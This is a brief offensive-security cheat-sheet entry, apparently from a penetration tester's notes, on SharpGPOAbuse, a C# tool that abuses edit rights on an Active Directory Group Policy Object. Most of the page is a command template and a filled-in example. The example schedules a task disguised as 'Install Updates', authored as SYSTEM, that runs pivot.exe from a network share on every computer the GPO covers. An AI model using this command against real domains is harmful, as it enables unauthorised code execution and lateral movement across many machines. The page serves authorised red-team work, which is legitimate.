# SharpGPOAbuse

> `SharpGPOAbuse` is a .NET application written in C# that can be used to take advantage of a user's edit rights on a Group Policy Object (GPO) in order to compromise the objects that are controlled by that GPO.
> `SharpGPOAbuse` can't be used to add GPOs, but only to modify existing GPOs. To add a GPO, see [[rsat#Create New GPO and Link to OU|here]].

---

## Modify Existing GPO to Schedule Task on All Affected Computers

```batch
SharpGPOAbuse.exe --AddComputerTask --TaskName "$TASK_NAME" --Author "$USER" --Command "$COMMAND" --Arguments "$COMMAND_ARGUMENTS" --GPOName "GPO_NAME"
```

Example:

```batch
SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```

---

## References

[SharpGPOAbuse - GitHub Repository](https://github.com/FSecureLABS/SharpGPOAbuse)

[SharpGPOAbuse - WithSecure Labs](https://labs.mwrinfosecurity.com/tools/sharpgpoabuse)
